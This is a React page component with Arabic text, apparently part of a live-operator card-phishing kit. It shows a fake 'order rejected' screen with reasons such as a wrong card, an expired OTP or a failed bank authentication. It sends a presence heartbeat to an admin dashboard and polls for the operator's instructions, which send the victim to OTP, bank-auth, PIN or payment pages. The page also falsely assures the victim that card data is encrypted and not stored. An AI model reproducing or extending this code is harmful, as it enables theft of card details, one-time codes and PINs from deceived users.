/* صفحة الرفض — رسائل مختلفة حسب سبب الرفض.
   تبقى ظاهرة للزائر، وتستطلع التوجيه في الخلفية: فإذا وجّهه المشرف من لوحة التحكم
   إلى خطوة جديدة (otp/bank-auth/pin/payment/success) ينتقل تلقائياً.
   تبقى ثابتة ما دام التوجيه "rejected" أو "wait". */
import { useEffect } from "react";
import { useSearch, useLocation } from "wouter";
import SiteLayout from "@/components/SiteLayout";
import { XCircle, Loader2 } from "lucide-react";
import { pollCurrentOrderDirective, startHeartbeat, clearCurrentOrder } from "@/lib/liveOrders";

const REASONS: Record<string, { title: string; desc: string }> = {
  card: {
    title: "تم رفض الطلب",
    desc: "معلومات البطاقة غير صحيحة. يرجى التأكد من بيانات البطاقة وإعادة المحاولة.",
  },
  otp: {
    title: "تم رفض الطلب",
    desc: "انتهت صلاحية رمز التحقق (OTP). يرجى طلب رمز جديد وإعادة المحاولة.",
  },
  bank: {
    title: "تم رفض الطلب",
    desc: "تم رفض المصادقة البنكية لعدم تأكيد الطلب. يرجى إعادة المحاولة وتأكيد الإشعار في تطبيقك البنكي.",
  },
};

/* خريطة وجهات التوجيه إلى مسارات الصفحات (لا تتضمن rejected حتى لا يعيد توجيه نفسه) */
const ROUTES: Record<string, string> = {
  otp: "/otp",
  "bank-auth": "/bank-auth",
  pin: "/pin",
  payment: "/payment",
  success: "/success",
};

export default function Rejected() {
  const search = useSearch();
  const reason = new URLSearchParams(search).get("reason") || "card";
  const info = REASONS[reason] || REASONS.card;
  const [, navigate] = useLocation();

  useEffect(() => {
    // نبضة حضور لإبقاء الزائر "متصل" في لوحة التحكم أثناء بقائه على صفحة الرفض
    const stopBeat = startHeartbeat();
    // استطلاع التوجيه: ينتقل الزائر فقط إذا غيّر المشرف التوجيه إلى خطوة جديدة معروفة
    const stopPoll = pollCurrentOrderDirective((directive: string) => {
      if (!directive || directive === "wait") return;
      const base = directive.split("?")[0];
      // طالما التوجيه ما زال "rejected" يبقى الزائر في صفحة الرفض
      if (base === "rejected") return;
      const path = ROUTES[base];
      if (!path) return;
      const query = directive.includes("?") ? "?" + directive.split("?")[1] : "";
      if (base === "success") clearCurrentOrder();
      const sep = query ? "&" : "?";
      navigate(path + query + sep + "directed=1");
    });

    return () => {
      stopBeat();
      stopPoll();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <SiteLayout>
      <section className="container py-16 max-w-xl">
        <div className="card-soft p-8 text-center fazaa-fade-up border-t-4 border-destructive">
          <div className="mx-auto mb-5 h-20 w-20 rounded-full bg-red-50 flex items-center justify-center">
            <XCircle className="h-12 w-12 text-destructive" />
          </div>
          <h1 className="text-2xl font-extrabold text-foreground">{info.title}</h1>
          <p className="mt-3 text-sm text-muted-foreground leading-relaxed max-w-md mx-auto">{info.desc}</p>

          <div className="mt-7 flex items-center justify-center gap-2 text-sm text-muted-foreground">
            <Loader2 className="h-4 w-4 animate-spin text-[#C9A227]" />
            <span>يرجى الانتظار، جارٍ مراجعة طلبك…</span>
          </div>
          <p className="mt-5 text-[11px] text-muted-foreground">جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.</p>
        </div>
      </section>
    </SiteLayout>
  );
}
